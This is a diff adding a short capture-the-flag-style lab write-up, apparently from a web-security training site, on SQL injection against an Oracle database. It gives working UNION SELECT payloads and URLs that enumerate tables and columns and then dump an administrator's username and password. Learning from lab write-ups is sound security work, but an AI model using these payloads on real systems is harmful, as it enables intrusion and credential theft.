@@ -1,0 +1,27 @@
+Lab: SQL injection attack, listing the database contents on Oracle
+
+Got list of tables with following:
+https://ac011f2c1ec8c57ac094217400cb0001.web-security-academy.net/filter?category=Lifestyle' UNION SELECT null, table_name FROM all_tables--
+Payload used: 'UNION SELECT null, table_name FROM all_tables--
+
+Interesting tables:
+USERS_DHTUAT
+
+Getting num_rows and table_name per table:
+https://ac011f2c1ec8c57ac094217400cb0001.web-security-academy.net/filter?category=Lifestyle%27%20UNION%20SELECT%20to_char(num_rows),%20table_name%20FROM%20all_tables--
+Payload used:  UNION SELECT to_char(num_rows), table_name FROM all_tables--
+
+
+Enumerating columns of USERS_DHTUAT table:
+https://ac011f2c1ec8c57ac094217400cb0001.web-security-academy.net/filter?category=Lifestyle%27%20UNION%20SELECT%20column_name,%20null%20from%20all_tab_columns%20WHERE%20table_name=%27USERS_DHTUAT%27--
+Yields following columns:
+USERNAME_LXUXPD
+PASSWORD_AOFTMK
+
+
+Pulling out above columns from USERS_DHTUAT table:
+https://ac011f2c1ec8c57ac094217400cb0001.web-security-academy.net/filter?category=Lifestyle%27%20UNION%20SELECT%20USERNAME_LXUXPD,%20PASSWORD_AOFTMK%20from%20USERS_DHTUAT--
+
+yields:
+administrator
+	ypsfbw39uinyh82qmq0i
